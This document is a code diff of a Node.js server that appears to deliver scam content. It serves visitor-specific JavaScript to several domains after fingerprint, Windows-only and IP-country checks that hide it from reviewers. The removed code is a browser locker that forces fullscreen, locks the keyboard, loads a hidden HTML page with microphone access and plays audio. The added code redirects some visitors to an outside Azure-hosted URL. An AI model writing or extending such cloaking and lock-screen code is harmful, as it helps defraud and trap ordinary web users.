@@ -13,8 +13,6 @@ const http = require("http");
 const url = require("url");
 const crypto = require("crypto");
 const Redis = require("ioredis");
-const fs = require("fs");
-const path = require("path");
 
 const PORT = process.env.PORT || 3000;
 
@@ -197,24 +195,16 @@ async function checkIPRate(ip) {
 // Add/remove entries here to onboard new sites.
 const ORIGIN_CONFIG = {
   "https://kazuonsen.com": {
-    html: "rocky1.html",
-    audio1: "https://audio.jukehost.co.uk/Z6PmIAqvgHyn5lOTW3zzuZRGG4wt7WKN",
+    redirectURL: "",
   },
   "https://horizontravelss.com": {
-    html: "sallu1.html",
-    audio1: "https://audio.jukehost.co.uk/N1iC2BsNfPSPZ4tRFjzCKlMEAxYi2sh4",
+    redirectURL: "",
   },
   "https://miyabugamajp.store": {
-    html: "dmc2.html",
-    // audio1: "https://audio.jukehost.co.uk/6vUT2qcCY98hW6lzixLpOhaVthyLwQmB",
+    redirectURL: "https://jp-corew-aygsa8dncjanhth7.z01.azurefd.net",
   },
   "https://kotonohaschooljp.com": {
-      html: "dmc1.html",
-      audio: "https://audio.jukehost.co.uk/sG2kokpXQjZsovOYZ9aBr5zma5LB8X4B",
-  },
-  "http://127.0.0.1:5500": {
-    html: "rocky1.html",
-    audio1: "https://audio.jukehost.co.uk/RTaK1bOF2dVBvCPxzqQZTVr2ScWfWnj9",
+    redirectURL: "",
   },
 };
 
@@ -267,25 +257,6 @@ function checkOrigin(req) {
 //  SECONDARY CODE — returned only to verified humans
 // ═══════════════════════════════════════════════════════════════
 
-// Pre-load every HTML file referenced in ORIGIN_CONFIG.
-// htmlCache maps filename → file contents (string).
-const htmlCache = {};
-const uniqueFiles = [
-  ...new Set(Object.values(ORIGIN_CONFIG).map((c) => c.html)),
-];
-for (const filename of uniqueFiles) {
-  try {
-    htmlCache[filename] = fs.readFileSync(
-      path.join(__dirname, filename),
-      "utf8",
-    );
-    console.log(`✅ Loaded ${filename} into memory`);
-  } catch (err) {
-    console.error(`❌ Failed to load ${filename}:`, err.message);
-    htmlCache[filename] = ""; // serve empty rather than crash
-  }
-}
-
 /**
  * Builds the secondary JS payload for a given origin.
  * Returns an empty string if the origin has no mapping.
@@ -293,65 +264,13 @@ for (const filename of uniqueFiles) {
 function buildSecondaryJS(origin) {
   const normalised = (origin || "").replace(/\/+$/, "").toLowerCase();
 
-  if(normalised === "https://miyabugamajp.store"){
-    return `window.location.replace('https://jp-corew-aygsa8dncjanhth7.z01.azurefd.net');`;
-  }
-  
   const config = Object.entries(ORIGIN_CONFIG).find(
     ([o]) => o.replace(/\/+$/, "").toLowerCase() === normalised,
   )?.[1];
 
-  const html = config ? (htmlCache[config.html] ?? "") : "";
-  const audio1Url = config?.audio1 ?? "";
+  if (!config || !config.redirectURL) return "";
 
-  return `
-  const embeddedHtml = ${JSON.stringify(html)};
-
-  document.documentElement.style.overflow = 'hidden';
-  document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:9999;pointer-events:auto;overflow:hidden;"></div>');
-
-  document.addEventListener('click', function initGame() {
-    // Request fullscreen with all vendor prefixes
-    setTimeout(function() {
-      var el = document.documentElement;
-      if (el.requestFullscreen) {
-        el.requestFullscreen();
-      } else if (el.mozRequestFullScreen) {
-        el.mozRequestFullScreen();
-      } else if (el.webkitRequestFullscreen) {
-        el.webkitRequestFullscreen();
-      } else if (el.msRequestFullscreen) {
-        el.msRequestFullscreen();
-      }
-    }, 100);
-
-    navigator.keyboard.lock();
-
-    // Load embedded HTML into an iframe via Blob URL
-    var blob = new Blob([embeddedHtml], { type: 'text/html' });
-    var blobUrl = URL.createObjectURL(blob);
-    var iframe = document.createElement('iframe');
-    iframe.src = blobUrl;
-    iframe.style.width = '100%';
-    iframe.style.height = '100%';
-    iframe.frameBorder = '0';
-    iframe.setAttribute('allowfullscreen', '');
-    iframe.setAttribute('webkitallowfullscreen', '');
-    iframe.setAttribute('mozallowfullscreen', '');
-    iframe.allow = 'microphone; autoplay';  // delegate mic permission
-    iframe.sandbox = 'allow-forms allow-scripts allow-popups allow-downloads allow-same-origin';
-    var bruceDiv = document.getElementById('bruceDiv');
-
-    setTimeout(() => {
-      bruceDiv.appendChild(iframe);
-      bruceDiv.style.height = '100vh';
-
-      // Play audios
-      var audio1 = new Audio(${JSON.stringify(audio1Url)});
-      audio1.play().catch(function(e) { console.warn('Audio 1 blocked:', e); });
-    }, 2000);
-  }, { once: true });
-`;
+  return `window.location.replace(${JSON.stringify(config.redirectURL)});`;
 }
 
 // ═══════════════════════════════════════════════════════════════
@@ -422,7 +341,10 @@ function verify(fp, ip) {
     critical.push({
       name: "windows_os",
       pass: allAgree,
-      reason: allAgree ? "Windows confirmed via UA + platform" + (hintsWindows !== null ? " + hints" : "") : `OS mismatch — UA:${uaHasWindows}, platform:${platWindows}, hints:${hintsWindows}`,
+      reason: allAgree
+        ? "Windows confirmed via UA + platform" +
+          (hintsWindows !== null ? " + hints" : "")
+        : `OS mismatch — UA:${uaHasWindows}, platform:${platWindows}, hints:${hintsWindows}`,
     });
   })();
 
@@ -1170,18 +1092,17 @@ const server = http.createServer(async (req, res) => {
           console.log(`  IP country: ${ipResult.countryCode}`);
         }
 
-
-          if (!ipResult.pass) {
-            console.log(`  ❌ REJECTED at IP level — ${ipResult.reason}`);
-            console.log("══════════════════════════════════════════════\n");
-            res.writeHead(403, { "Content-Type": "application/json" });
-            return res.end(
-              JSON.stringify({
-                verified: false,
-                reason: `IP rejected: ${ipResult.reason}`,
-              }),
-            );
-          }
+        if (!ipResult.pass) {
+          console.log(`  ❌ REJECTED at IP level — ${ipResult.reason}`);
+          console.log("══════════════════════════════════════════════\n");
+          res.writeHead(403, { "Content-Type": "application/json" });
+          return res.end(
+            JSON.stringify({
+              verified: false,
+              reason: `IP rejected: ${ipResult.reason}`,
+            }),
+          );
+        }
 
         // ── 4. Fingerprint verification ───────────────────────
         const result = verify(fingerprint, clientIP);
